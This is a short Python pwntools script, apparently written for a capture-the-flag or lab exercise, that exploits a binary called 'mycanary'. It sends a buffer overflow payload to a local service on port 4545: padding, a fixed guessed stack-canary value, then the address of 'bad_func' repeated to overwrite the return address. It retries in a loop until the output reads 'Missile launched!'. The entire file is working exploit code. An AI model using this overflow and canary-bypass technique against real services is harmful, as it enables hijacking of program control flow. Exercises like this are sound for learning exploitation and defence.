#!/usr/bin/python
from pwn import *

e = ELF("../src/mycanary", checksec=False)
bad_func = e.symbols['bad_func']



payload = b"A" * 100 + b"\xef\xbe\x01\xde" + p32(bad_func) + p32(bad_func) + p32(bad_func) + p32(bad_func) 

c = 0
# brute force loop
while True:
	print(p32(bad_func))
	# open program
	p = remote("127.0.0.1",4545)
	#print(p.recvline())
	p.sendline(payload)
	# recieve trash text and discard
	line = p.recv()
	
	print(line)
	p.close()

	if b"Missile launched!" in line:
		# SUCCESS!!$$$
		print(line)
		print("Success after %d attempts" % c)
		break
	else:
		c += 1
